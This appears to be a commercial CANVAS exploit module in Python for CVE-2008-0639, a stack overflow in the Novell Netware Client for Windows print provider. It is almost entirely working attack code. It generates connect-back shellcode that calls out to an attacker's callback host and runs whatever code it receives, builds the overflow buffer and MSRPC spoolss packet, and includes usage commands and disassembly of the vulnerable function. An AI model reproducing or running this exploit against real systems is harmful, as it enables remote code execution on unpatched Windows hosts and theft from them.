#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from msrpcexploit import msrpcexploit
from MOSDEF import mosdef
from shellcode import shellcodeGenerator
from libs.newsmb.libdcerpc import s_dce_raw_unistring


# GUI info
NAME='Novell Netware Client for Windows'
DESCRIPTION='Novell Netware Client for Windows Print Provider Stack Overflow'
VERSION='1.0'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Novell"
DOCUMENTATION['Date public']='02/11/2008'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-08-005.html'
DOCUMENTATION['Platforms Tested']=''
DOCUMENTATION["CVE Name"] = "CVE-2008-0639"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0639"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['Notes']='Use the setthreadtoken module to revert back to LocalSystem once the exploitation is successful'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']

CHANGELOG="""
"""

NOTES="""
Usage:
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
./exploits/nwspool_c/nwspool_c.py -v 1 -t 10.10.11.136 -l 10.10.11.1 -d 5555

Tested on:
Windows 2000 Professional SP4 French with Novell Netware Client for Windows v4.91 SP4

People at Novell are LoL:
.text:580105A3 loc_580105A3:                           ; CODE XREF: sub_580104ED+A5j
.text:580105A3                 push    '!'             ; Ch
.text:580105A5                 mov     edx, [ebp+arg_4]
.text:580105A8                 push    edx             ; Str
.text:580105A9                 call    wcschr
.text:580105AE                 add     esp, 8
.text:580105B1                 mov     [ebp+var_4], eax
.text:580105B4                 cmp     [ebp+var_4], 0
.text:580105B8                 jz      short loc_58010615
.text:580105BA                 mov     eax, [ebp+var_4]
.text:580105BD                 sub     eax, [ebp+arg_4]
.text:580105C0                 sar     eax, 1
.text:580105C2                 shr     eax, 1
.text:580105C4                 push    eax             ; Count
.text:580105C5                 mov     ecx, [ebp+arg_4]
.text:580105C8                 push    ecx             ; Source
.text:580105C9                 lea     edx, [ebp+var_208]
.text:580105CF                 push    edx             ; Dest
.text:580105D0                 call    wcsncpy

"""

targets = {
    0: ['Autoversioning (N/A)',0],
    1: ['Novell Netware Client on Windows 2000',0x001f5028],
}


class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version        = 0
        self.badstring      = '\0\xff'
        self.UUID           = u'12345678-1234-abcd-ef00-0123456789ab'
        self.uuidversion    = u'1.0'
        self.targetfunction = 0x0 # EnumPrintersW
        self.name           = NAME
        self.subesp         = 0
        self.listenerArgsDict['fromcreatethread'] = 0 #force it to 0

    def buildConnectionList(self):
        self.connectionList=['ncacn_np:%s[\\spoolss]'%(self.host)]
        return self.connectionList

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':self.subesp})
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('SmallRecvExecWin32',{'socketreg':'FDSPOT'})
        sc.addAttr('UseWS2Ordinal',None)
        rawshellcode=sc.get()
        self.log('Length of raw shellcode=%d'%(len(rawshellcode)))
        self.shellcode=self.intel_encode(self.badstring,rawshellcode)
        if not self.shellcode:
            self.log('Shellcode could not be generated!')
        self.log('Length of encoded shellcode=%d'%(len(self.shellcode)))
        return self.shellcode

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        self.log('target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%result)
            return 1
        #elif app.result.find('XP')>-1:
        #    self.log('OS vulnerable: %s'%result)
        #    self.version=2
        #    return 1
        else:
            self.log('OS not vulnerable: %s'%result)
        return 0

    def buildDcePacket(self):
        self.description,self.eip=targets[self.version]
        buffer=''
        buffer+=mosdef.assemble("""push $0x34
pop %ecx
movb $0x02,%ch
addl %ecx,%eax
jmp %eax
""",'x86') #0x210+0x24=0x234
        buffer+='C'*(0x1c-len(buffer))
        buffer+=mosdef.assemble('movl 0x34(%esp),%eax','x86')
        buffer+='\xeb\xde' #jmp back
        buffer+='D'*(0x24-len(buffer))
        buffer+=self.shellcode
        data=''
        data+='\\\0'*0x102
        data+=struct.pack('<L',0x00010ff0) #var_4
        data+='BBBB' #ebp
        data+=struct.pack('<L',self.eip) #eip #jmp esp
        data+=buffer
        data+='E'*(0x258-len(buffer)) #0x258-0x24=0x234
        data+='!\0'
        packet=''
        packet+=intel_order(8)
        packet+=intel_order(1)
        packet+=s_dce_raw_unistring(data)
        packet+=intel_order(1)
        packet+=intel_order(0)
        packet+=intel_order(0)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print "%d: %s"%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
